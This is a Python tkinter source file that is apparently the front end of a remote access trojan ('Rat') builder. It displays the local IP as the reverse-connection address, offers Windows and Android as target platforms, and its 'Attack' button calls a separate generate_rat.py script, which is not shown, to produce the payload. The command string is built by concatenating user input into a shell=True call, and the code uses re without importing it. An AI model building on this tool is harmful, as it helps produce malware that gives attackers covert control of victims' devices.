from tkinter import *;
from tkinter.ttk import Combobox;
import subprocess;


def get_ip():
    ifconfig_result = subprocess.check_output(["ifconfig"]).decode()
    current_ip = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ifconfig_result)
    if (not current_ip):
        print("[-] cannot read ip addr")
    else:
        return (current_ip.group(0))


def generate_payload():
    platform =combo.get();
    #print(platform );
    name=filename.get();
    #print(name);
    subprocess.call("python3 generate_rat.py -p "+platform+" -f "+name ,  shell= True)


root=Tk();
root.title("Rat")
root.geometry("500x500");

file=Label(root,text="Reverse ip address:",pady=20,padx=12,fg="Black",font=("arial  ", 12));
file.grid(row=4,column=3);
filename=StringVar();

file=Label(root,text=get_ip(),pady=20,padx=12,fg="red",font=("arial ", 12));
file.grid(row=4,column=4);
filename=StringVar();


file=Label(root,text="Enter file name",pady=20,padx=12,fg="black",font=("arial ", 12));
file.grid(row=1,column=3);
filename=StringVar();
fileEntry=Entry(root,textvariable=filename);
fileEntry.grid(row=1,column=4);

platform=["windows-32","android","windows-64"];
combo=Combobox(root,values=platform);
file=Label(root,text="Enter platform name",pady=20,padx=12,font=("arial", 12));
file.grid(row=3,column=3);
combo.set("Select platform");
combo.grid(row=3,column=4);
button=Button(root,text="Attack",command=generate_payload,width=16,bg="black",fg="white").grid(row=7,column=4,pady=50);
root.geometry("500x500");
root.mainloop()